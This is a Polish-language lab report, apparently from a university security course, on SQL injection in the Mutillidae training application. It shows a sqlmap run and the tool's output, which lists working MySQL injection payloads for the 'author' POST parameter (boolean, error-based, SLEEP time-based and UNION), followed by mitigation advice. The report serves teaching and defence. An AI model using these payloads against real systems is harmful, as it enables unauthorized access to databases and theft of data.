## Nazwa podatności: SQLMAP Practice (SQL Injcetion - error-based oraz time-based blind)

**Istotność:** Wysoka

---

**Opis:**
SQLMap to potężne narzędzie do automatycznego wykrywania i wykorzystywania podatności SQL Injection w aplikacjach internetowych. Jest napisane w języku Python i umożliwia atakującemu przeprowadzenie zautomatyzowanych testów penetracyjnych, identyfikując luki w zabezpieczeniach aplikacji, które mogą prowadzić do wstrzykiwania kodu SQL.

- SQL Injection - error-based:
W tej technice atakujący wykorzystuje błędy generowane przez bazę danych w odpowiedzi na wstrzyknięty złośliwy kod SQL. Atakujący wprowadza manipulujące zapytanie SQL dane, które mogą prowadzić do błędów w bazie danych. Następnie, poprzez analizę odpowiedzi serwera, atakujący jest w stanie uzyskać informacje na temat struktury bazy danych oraz jej zawartości. Na przykład, atakujący może próbować wstrzyknąć zapytanie takie jak SELECT * FROM users WHERE id = '1' AND '1'='1', które zawsze zwraca prawdę, ale prowadzi do błędu, jeśli typ danych jest nieprawidłowy. Analizując komunikaty o błędach, atakujący może wydedukować strukturę bazy danych i uzyskać dostęp do poufnych informacji.

- SQL Injection - time-based blind:
Ta technika jest używana, gdy aplikacja nie zwraca bezpośrednich komunikatów o błędach, ale atakujący jest w stanie dedukować informacje na temat bazy danych poprzez manipulowanie czasem odpowiedzi serwera. Atakujący wstrzykuje złośliwy kod SQL, który opóźnia odpowiedź serwera w zależności od prawdziwości określonego warunku. Na przykład, atakujący może wstrzyknąć zapytanie takie jak SELECT * FROM users WHERE id = '1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),1) - jeśli pierwszy znak nazwy bazy danych to 'a', to zapytanie spowoduje opóźnienie odpowiedzi serwera. Analizując czas odpowiedzi, atakujący jest w stanie wnioskować informacje na temat struktury bazy danych i jej zawartości.

---

**Technika eksploatacji:**
Po wybraniu z listy rozwijanej użytkownika, którego blog chce się zobaczyć wysyłane jest poniższe zapytanie POST na serwer:
![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/5e298ba7-8a60-47bc-ab5a-d2da964b306b)

Utworzono plik request.txt z zawartością powyższego zapytania.
![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/d430c661-7a72-42cf-8d33-dc39255b3728)

Atakowanymi parametrami są oraz `author` oraz `view-someones-blog-php-submit-button`.

Jak poniżej uruchomiono narzędzie sqlmap:
![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/163e2db8-bdf8-48d3-9057-1086ed0c81ca)

Wykryło ono, iż parametr `author` jest podatnym parametrem. Ostatecznym wynikiem działania programu sqlmap jest:
```sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
---
Parameter: author (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: author=admin' AND 2783=2783#&view-someones-blog-php-submit-button=View Blog Entries

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: author=admin' AND (SELECT 9586 FROM(SELECT COUNT(*),CONCAT(0x7176717671,(SELECT (ELT(9586=9586,1))),0x716b706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OhCA&view-someones-blog-php-submit-button=View Blog Entries

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: author=admin' AND (SELECT 3065 FROM (SELECT(SLEEP(5)))GkAB)-- URoT&view-someones-blog-php-submit-button=View Blog Entries

    Type: UNION query
    Title: MySQL UNION query (random number) - 4 columns
    Payload: author=admin' UNION ALL SELECT 5318,5318,5318,CONCAT(0x7176717671,0x654b6f75534a4f4a415a596e4169706d436365645a45524d764b5a5078554c415779684b6b744351,0x716b706b71)#&view-someones-blog-php-submit-button=View Blog Entries
---
```
**Mitygacja:**
Aby skutecznie zmitygować podatność SQL Injection, należy wdrożyć zestaw najlepszych praktyk oraz zabezpieczeń. Przede wszystkim, jedną z najskuteczniejszych metod ochrony jest stosowanie przygotowanych zapytań (prepared statements) i zapytań parametryzowanych. Techniki te oddzielają kod SQL od danych wejściowych użytkownika, co uniemożliwia wstrzyknięcie złośliwego kodu SQL. Wszystkie dane wejściowe, zarówno te pochodzące od użytkowników, jak i z innych źródeł, muszą być rygorystycznie walidowane i filtrowane. Akceptować należy tylko dane zgodne z oczekiwanym formatem i odrzucać wszelkie podejrzane lub niespodziewane wartości. Ograniczenie uprawnień użytkowników bazy danych jest kolejnym kluczowym krokiem. Aplikacja powinna korzystać z kont użytkowników bazy danych o minimalnych niezbędnych uprawnieniach, a konta te nie powinny mieć nadmiarowych uprawnień, takich jak możliwość wykonywania operacji administracyjnych. Używanie mechanizmów ORM (Object-Relational Mapping), takich jak Hibernate czy Entity Framework, może pomóc w ochronie przed SQL Injection, ponieważ automatycznie generują bezpieczne zapytania SQL bazując na kodzie aplikacji. Ważne jest także regularne aktualizowanie i łatanie oprogramowania, aby upewnić się, że wszystkie komponenty aplikacji, w tym serwer bazy danych, frameworki i biblioteki, są na bieżąco aktualizowane i zabezpieczane przed znanymi podatnościami. Regularne monitorowanie i logowanie aktywności w bazie danych może pomóc w szybkim wykryciu i reagowaniu na podejrzane działania wskazujące na próby ataków SQL Injection. Dodatkowo, regularne przeprowadzanie testów penetracyjnych oraz audytów bezpieczeństwa pozwala na identyfikację i naprawę potencjalnych luk w zabezpieczeniach, zanim zostaną one wykorzystane przez atakujących. Implementacja tych praktyk i mechanizmów zabezpieczeń pozwala znacząco zredukować ryzyko wystąpienia podatności SQL Injection, chroniąc aplikację oraz jej użytkowników przed potencjalnymi atakami i kompromitacją danych.

